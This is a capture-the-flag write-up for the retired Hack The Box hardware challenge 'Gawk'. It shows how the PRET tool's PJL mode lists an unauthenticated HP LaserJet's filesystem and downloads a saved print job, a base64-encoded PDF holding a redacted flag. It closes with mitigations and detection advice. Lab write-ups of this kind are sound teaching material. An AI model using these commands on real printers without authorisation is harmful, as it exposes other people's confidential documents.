---
challenge: Gawk
type: Hardware
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [hardware, printer, pjl, pret, path-traversal, base64]
---

# Gawk — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

The service is an HP LaserJet printer that speaks PJL. PRET enumerates the device filesystem and downloads a PDF stored in a print queue. The downloaded file is base64; decoding it opens the PDF and reveals the flag.

## Statement and surface

- Hardware, Easy, retired.
- An IP and printer port are provided.
- The scenario asks for help recovering a document from a printer.

```bash
nmap -Pn -sV -p <PORT> <IP>
nc <IP> <PORT>
```

## Reconnaissance

- The port does not answer HTTP or a service identifiable by `nmap`.
- Connecting returns a printer banner.
- PRET in `pjl` mode identifies the device as an HP LaserJet 4200.

```bash
python2.7 pret.py <IP>:<PORT> pjl
```

## Protocol analysis

PJL exposes an internal filesystem through commands such as `FSUPLOAD`, `FSDOWNLOAD`, `FSDIRLIST` and `FSQUERY`. PRET wraps them and provides `ls`, `cd`, `find` and `get`.

```text
/> ls
d - PJL
d - PostScript
d - saveDevice
d - webServer
```

## Why it works

The printer does not authenticate PJL access or restrict filesystem reads. Jobs stored under `saveDevice/SavedJobs/InProgress` are accessible. The PDF is downloaded with `get` and its content is base64-encoded, not encrypted.

## Local reproduction

```bash
# Requires an accessible printer or PJL emulator.
python2.7 pret.py <IP>:<PORT> pjl
```

- PRET runs on Python 2.7; a container is convenient.
- `find` lists paths and `get` downloads a file.

## Exploitation

```text
/> find
/saveDevice/SavedJobs/InProgress/HR_Policies.pdf
/> get /saveDevice/SavedJobs/InProgress/HR_Policies.pdf
/> exit
```

```bash
file HR_Policies.pdf
base64 -d HR_Policies.pdf > HR_Policies_decoded.pdf
file HR_Policies_decoded.pdf
xdg-open HR_Policies_decoded.pdf
```

The PDF shows the flag on the first page; it is redacted.

## Evidence

- Banner and printer identification.
- `find` listing with the PDF path.
- Decoded PDF with the flag redacted.

## Lessons learned

- Printers are devices with filesystems and network services.
- PJL can expose jobs and configuration without authentication.
- A file with a PDF extension may be base64 and require decoding.

## Mitigations and detection

- Disable unused PJL/FTP/PostScript and segment the printer.
- Require authentication and restrict access by IP.
- Delete retained jobs and audit `FSUPLOAD`/`FSDOWNLOAD`.
- Alert on PJL commands, `saveDevice` downloads and access from non-admin hosts.

## References

- <https://www.hackthebox.com/challenges/Gawk>
- <https://github.com/RUB-NDS/PRET>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1005/>
